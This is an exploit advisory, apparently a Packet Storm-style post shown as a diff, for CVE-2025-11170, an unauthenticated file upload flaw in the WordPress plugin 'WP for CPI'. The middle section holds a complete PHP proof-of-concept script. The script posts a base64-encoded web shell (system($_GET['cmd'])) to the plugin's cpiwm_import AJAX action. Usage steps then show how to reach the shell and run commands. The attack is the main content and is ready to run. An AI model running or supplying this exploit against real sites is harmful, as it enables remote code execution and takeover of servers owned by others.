@@ -1,0 +1,117 @@
+=============================================================================================================================================
+| # Title     : WP for CPI 1.0.2 Unauthenticated Arbitrary File Upload                                                                      |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.1 (64 bits)                                                            |
+| # Vendor    : https://discover.commoninja.com/wordpress/plugin/cpi-wp-migration                                                           |
+=============================================================================================================================================
+
+[+] Summary : 
+
+The WordPress plugin "WP for CPI" versions <= 1.0.2 suffer from an
+unauthenticated arbitrary file upload vulnerability via the "cpiwm_import"
+AJAX action. An attacker can upload arbitrary PHP files and achieve
+remote code execution.
+
+The vulnerable endpoint requires no authentication, nonce, or capability
+checks.
+
+Affected endpoint:
+    /wp-admin/admin-ajax.php?action=cpiwm_import
+
+
+2. Fake Python PoC Notice
+-------------------------
+
+[+] References : https://packetstorm.news/files/id/211558/ CVE-2025-11170
+
+A previously circulating Python PoC was analyzed and confirmed to be
+non-functional, incorrect, and not aligned with the plugin’s real
+behavior. The script was determined to be fake and technically invalid.
+
+A corrected analysis and working PoC are provided below.
+
+
+3. Technical Details
+--------------------
+
+The plugin exposes the action parameter:
+
+    action=cpiwm_import
+
+The server accepts the following POST parameters:
+
+    filename   - the resulting file name on disk
+    data       - base64 encoded file contents
+    index      - import index (not validated)
+
+Uploaded files are saved to:
+
+    /wp-content/plugins/cpi-wp-migration/storage/{filename}
+
+A successful upload returns the response:
+
+    0
+
+
+4. Working PoC (PHP)
+---------------------
+
+<?php
+/*
+   Corrected PoC for CVE-2025-11170
+   By Indoushka
+*/
+
+$target = "http://target.com"; // no trailing slash
+$ajax   = $target . "/wp-admin/admin-ajax.php";
+
+$filename = "indoushka.php";
+$payload  = "<?php system(\$_GET['cmd']); ?>";
+$data_b64 = base64_encode($payload);
+
+$post = [
+    "action"   => "cpiwm_import",
+    "filename" => $filename,
+    "data"     => $data_b64,
+    "index"    => "0"
+];
+
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $ajax);
+curl_setopt($ch, CURLOPT_POST, true);
+curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+$response = curl_exec($ch);
+curl_close($ch);
+
+echo "Server Response: $response\n";
+
+if(trim($response) === "0"){
+    echo "[+] Upload Successful!\n";
+    echo "Shell Path:\n";
+    echo $target . "/wp-content/plugins/cpi-wp-migration/storage/" . $filename . "\n";
+} else {
+    echo "[!] Upload failed.\n";
+}
+?>
+
+
+5. Usage Instructions
+----------------------
+
+Save the file:
+
+    poc.php
+
+Run:
+
+    php poc.php
+
+Access your shell:
+
+    http://target.com/wp-content/plugins/cpi-wp-migration/storage/indoushka.php?cmd=id
+
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
